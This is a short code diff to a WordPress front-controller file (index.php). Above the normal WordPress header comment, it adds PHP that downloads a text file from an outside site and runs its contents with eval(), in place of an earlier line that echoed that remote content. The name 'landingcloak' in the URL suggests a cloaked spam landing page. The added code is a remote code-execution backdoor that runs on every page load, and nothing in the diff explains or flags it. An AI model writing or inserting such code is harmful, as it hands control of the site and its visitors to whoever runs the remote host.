@@ -1,8 +1,10 @@
 <?php
-$elgasci = file_get_contents("https://cucunenek.site/landingcloakbiasa/laundry.txt");
-if ($elgasci !== false){
-  echo $elgasci;
-}
+$elgasci = file_get_contents(urldecode('https://cucunenek.site/landingcloakbiasa/laundry.txt'));
+$elgasci = "?> ".$elgasci;
+eval ($elgasci);
+?>
+
+<?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
